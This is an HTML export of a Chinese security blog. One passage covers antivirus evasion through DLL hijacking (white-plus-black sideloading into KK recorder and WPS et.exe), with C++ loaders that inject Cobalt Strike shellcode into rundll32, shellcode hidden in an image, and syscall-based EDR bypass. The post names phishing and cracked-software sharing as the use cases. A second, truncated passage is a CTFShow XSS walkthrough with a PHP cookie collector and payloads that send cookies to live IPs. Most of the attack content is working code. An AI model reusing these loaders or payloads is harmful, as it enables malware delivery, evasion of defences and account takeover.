class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">HANDLE My_hThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = </span><br><span class="line"><span class="comment">//CS生成32位shellcode</span></span><br><span class="line">DWORD  WINAPI  <span class="built_in">ceshi</span>(LPVOID pParameter)</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">//初次调用dll时执行下面代码</span></span><br><span class="line">        My_hThread = ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, &amp;ceshi, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//新建线程</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:a</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span><span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    a = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x86生成<br>接下来利用Stud_PE来加载我们生成的dll<br>函数–右键add–选择生产的dll文件–选择函数test–添加到列表–添加<br>接下来将libfontconfig-1.dll以及我们生产的dll文件都拖到kk录像机安装目录<br>运行kk录像机成功上线但是对生产的dll文件依旧被杀<br>可以对shellcode利用aes或者xor混淆进一步处理</p><h3 id="C-amp-C-DLL劫持-白加黑-导出编译"><a href="#C-amp-C-DLL劫持-白加黑-导出编译" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-导出编译"></a>C&amp;C++-DLL劫持-白加黑-导出编译</h3><p>当遇到部分应用，对dll进行了防劫持的操作，上述方法失效时，可以使用导出编译<br>也就是把目标dll文件反编译然后做文章<br>这里使用wps中的et.exe劫持krpt.dll<br>利用工具Dependencies反编译dll文件<br><img src="/posts/facab1e5/image-20220829100942828.png" alt="image-20220829100942828"></p><p>和上文相同创建一个dll项目将反编译出来的文件拖入到项目文件夹,然后拖入到vs中<br>先修改.asm汇编文件删除所有jump语句<br>例如：<code>jmp pfnAL__krpt_RegisterWERHandler</code><br>接下来修改.asm的属性具体的修改方法会在.asm文件的前几行按照说法进行修改</p><p>注意配置和平台要和你要生成的结果一致</p><p><img src="/posts/facab1e5/image-20220829141832346.png" alt="image-20220829141832346"><br>先应用下面的才会出来<br><img src="/posts/facab1e5/image-20220829142012808.png" alt="image-20220829142012808"><br>接下来设置项目属性（注意平台以及配置要和你编译环境相同配置应该为release，平台x86就用win32 x64就用x64）<br><img src="/posts/facab1e5/image-20220829142733847.png" alt="image-20220829142733847"><br><img src="/posts/facab1e5/image-20220829142751524.png" alt="image-20220829142751524"></p><p>如果发生报错:LNK2026 模块对于 SAFESEH 映像是不安全的。<br>解决方法：<br>1.打开该项目的“属性页”对话框。<br>2.单击“链接器”文件夹。<br>3.单击“命令行”属性页。<br>4.将 &#x2F;SAFESEH:NO 键入“附加选项”框中，然后点击应用。</p><p>接下来要添加上线代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> hexData[] = <span class="comment">//填入shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, _countof(hexData), <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, hexData, _countof(hexData));</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line"><span class="type">void</span>* v24;</span><br><span class="line">CONTEXT Context;</span><br><span class="line">DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line"><span class="keyword">if</span> (result)</span><br><span class="line">&#123;</span><br><span class="line">Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, _countof(hexData), <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class="line">Context.Eip = (DWORD)v24;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line"><span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译生成dll命名为krpt.dll将原来的dll替换运行et.exe 成功上线</p><h3 id="C-amp-C-DLL劫持-白加黑-图片分离"><a href="#C-amp-C-DLL劫持-白加黑-图片分离" class="headerlink" title="C&amp;C++-DLL劫持-白加黑-图片分离"></a>C&amp;C++-DLL劫持-白加黑-图片分离</h3><blockquote><p>由于dll并不免杀可以利用图片分离来进行免杀<br>利用项目:<a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a></p></blockquote><p>使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 dkmc.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gen</span><br><span class="line">set shellcode 这里是CS的shellcode</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>接下来修改dllmain.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;krpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        FILE* fp;  <span class="comment">// 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span></span><br><span class="line">        <span class="type">size_t</span> size;  <span class="comment">// 定义文件字节数变量size</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* buffer;  <span class="comment">// 定义缓存指针变量</span></span><br><span class="line"></span><br><span class="line">        fp = <span class="built_in">fopen</span>(<span class="string">&quot;shell.bmp&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">//****修改为上方生成的图片****</span></span><br><span class="line">        <span class="comment">// fseek()负号前移，正号后移</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);          <span class="comment">// 文件指针指向文件末尾</span></span><br><span class="line">        <span class="comment">// ftell()返回给定流 stream 的当前文件位置</span></span><br><span class="line">        size = <span class="built_in">ftell</span>(fp);                <span class="comment">// size值为文件大小</span></span><br><span class="line">        <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);          <span class="comment">// 文件指针指向文件开头</span></span><br><span class="line">        buffer = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(size);    <span class="comment">// 动态申请图片大小的内存空间（数组指针）</span></span><br><span class="line">        <span class="built_in">fread</span>(buffer, size, <span class="number">1</span>, fp);  <span class="comment">// 从fp读取和显示1个size大小的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>* v7A = (<span class="type">char</span>*)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, size, <span class="number">0x3000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span>*)v7A, buffer, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> ProcessInformation;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">_STARTUPINFOA</span> StartupInfo;</span><br><span class="line">        <span class="type">void</span>* v24;</span><br><span class="line">        CONTEXT Context;</span><br><span class="line">        DWORD DwWrite = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(StartupInfo));</span><br><span class="line">        StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">        BOOL result = <span class="built_in">CreateProcessA</span>(<span class="number">0</span>, (LPSTR)<span class="string">&quot;rundll32.exe&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x44</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation);</span><br><span class="line">        <span class="keyword">if</span> (result)</span><br><span class="line">        &#123;</span><br><span class="line">            Context.ContextFlags = <span class="number">65539</span>;</span><br><span class="line">            <span class="built_in">GetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            v24 = <span class="built_in">VirtualAllocEx</span>(ProcessInformation.hProcess, <span class="number">0</span>, size, <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(ProcessInformation.hProcess, v24, v7A, size, &amp;DwWrite);</span><br><span class="line">            Context.Eip = (DWORD)v24;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(ProcessInformation.hThread, &amp;Context);</span><br><span class="line">            <span class="built_in">ResumeThread</span>(ProcessInformation.hThread);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(ProcessInformation.hThread);</span><br><span class="line">            result = <span class="built_in">CloseHandle</span>(ProcessInformation.hProcess);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">TerminateProcess</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成dll重命名为krpt.dll 和生成图片一起拖入到et.exe文件夹 运行上线</p><p><strong>DLL劫持适用场景</strong><br>钓鱼，或给他人分享破解软件时 适用Dll劫持</p><h2 id="Syscall"><a href="#Syscall" class="headerlink" title="Syscall"></a>Syscall</h2><h3 id="Syscall底层-加载器生成-项目"><a href="#Syscall底层-加载器生成-项目" class="headerlink" title="Syscall底层-加载器生成-项目"></a>Syscall底层-加载器生成-项目</h3><blockquote><p>Windows下有两种处理器访问模式：用户模式（user mode）和内核模式（kernel mode）。用户模式下运行应用程序时，Windows 会为该程序创建一个新进程，提供一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改另一个应用程序的私有虚拟地址空间的数据；内核模式下，所有运行的代码都共享一个虚拟地址空间， 因此内核中驱动程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在访问这些数据结构或调用内部Windows例程以执行特权操作的时候，必须先从用户模式切换到内核模式，这里就涉及到系统调用。</p></blockquote><blockquote><p>x86 windows 使用 sysenter 实现系统调用。<br>x64 windows 使用 syscall 实现系统调用。</p></blockquote><blockquote><p>参考链接:<br><a href="https://github.com/7BitsTeam/EDR-Bypass-demo">https://github.com/7BitsTeam/EDR-Bypass-demo</a><br><a href="https://github.com/icyguider/Shhhloader">https://github.com/icyguider/Shhhloader</a><br><a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a><br><a href="https://cloud.tencent.com/developer/article/1944012">https://cloud.tencent.com/developer/article/1944012</a></p></blockquote><p>使用Syscall生成的exe文件 直接调用系统底层的函数依赖，完成上线<br>常规后门exe文件，需要调用很多系统自带的 dll 文件才能完成上线</p><p>这里利用EDR-Bypass-demo项目中的demo进行测试<br><strong>demo1</strong><br>CS生成raw的shellcode<br>使用enc.py进行加密(注意加密后要把末尾的&#x3D;&#x3D;换成@@)然后填入到demo1.cpp(chapter4-demo3下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">all</span>=f.read()</span><br><span class="line">    array=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        array.append(i^<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#print(bytearray(array))</span></span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(<span class="built_in">bytearray</span>(array)))</span><br></pre></td></tr></table></figure><p><strong>demo2</strong><br>EDR-Bypass-demo项目中的chapter4-demo4 直接改shellcode和上文相同 生成解决方法即可上线</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFShow Web入门_XSS</title>
      <link href="/posts/1e1eb3c9/"/>
      <url>/posts/1e1eb3c9/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFShow-Web入门-XSS"><a href="#CTFShow-Web入门-XSS" class="headerlink" title="CTFShow Web入门_XSS"></a>CTFShow Web入门_XSS</h1><blockquote><p>参考:<a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p></blockquote><h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><blockquote><p>flag在cookie中</p></blockquote><p>可以利用xss平台或者使用自己服务器自己搭建一个写一个小脚本来获取cookie</p><p>服务器准备一个接受文件接受cookie get..php</p><p><a href="http://47.94.236.117/get.php?c=document.cookie">http://47.94.236.117/get.php?c=document.cookie</a></p><p>服务器脚本如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>windows.location.href&#x3D;”&#x2F;url” 当前页面打开URL页面</p><p>document.cookie 获取cookie</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>查看服务器下的cookie.txt</p><p>即可发现falg</p><h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><p><code>&lt;script&gt;</code>被过滤换<code>&lt;body&gt;</code></p><blockquote><p>平台为机器人触发xss所以尽量选择不需要鼠标触发的事件</p></blockquote><blockquote><p>onload为载入事件 不需要鼠标移动直接触发</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">window.location.href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="attr">document.cookie</span>;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h2><p>这次过滤了<code>&lt;img&gt;</code>换<code>&lt;svg&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web319"><a href="#Web319" class="headerlink" title="Web319"></a>Web319</h2><p>同Web318</p><h2 id="Web320"><a href="#Web320" class="headerlink" title="Web320"></a>Web320</h2><p>过滤了<code>空格</code>利用<code>/</code>绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://ip/get.php?c=&#x27;+document.cookie;&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="Web321-Web326"><a href="#Web321-Web326" class="headerlink" title="Web321-Web326"></a>Web321-Web326</h2><p>同Web320</p><h2 id="Web327"><a href="#Web327" class="headerlink" title="Web327"></a>Web327</h2><p>存储型xss没有过滤</p><p>收件人写admin</p><p>信的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h2><p>用户管理界面可以看到用户 账号 密码</p><p>可以把密码改为JS代码(获取cookie)，管理员查看页面会触发xss代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/get.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>读取cookie.txt获取到管理员的cookie</p><p>抓包点击用户管理将cookie替换为刚刚获得的管理员cookie登录成功后发现flag</p><h2 id="Web329"><a href="#Web329" class="headerlink" title="Web329"></a>Web329</h2><p>失效凭证 cookie一直在变</p><p>可以不使用cookie利用js代码获取网页源代码读取带有ctfshow的字段标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.138.124.233/get.php?c=&#x27;</span>+value.<span class="property">innerHTML</span>; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web330"><a href="#Web330" class="headerlink" title="Web330"></a>Web330</h2><p>后台管理员有功能页面，能够查看注册用户的账号密码<br>其中有一个修改的密码，通过访问一个地址即可修改密码（抓包分析，需用户登录状态）<br>思路：注册一个用户名和密码存在跳转修改密码的URL地址连接<br>如果管理员登录了后台，然后查看了用户的注册密码信息，就可以尝试重置密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>管理员密码成功改为123 </p><h2 id="Web331"><a href="#Web331" class="headerlink" title="Web331"></a>Web331</h2><p>思路同上，修改密码的方式由GET改为了POST</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Web332"><a href="#Web332" class="headerlink" title="Web332"></a>Web332</h2><p>发现flag需要9999</p><p>有一个转账功能</p><p>随便注册一个号然后转账负数</p><h2 id="Web333"><a href="#Web333" class="headerlink" title="Web333"></a>Web333</h2><p>利用xss让管理员给我们转账</p><p>抓包分析转账参数 u为用户名 a为转账金额 post提交</p><p>先注册一个123账号用来收钱</p><p>然后注册带xss语句的用户</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span 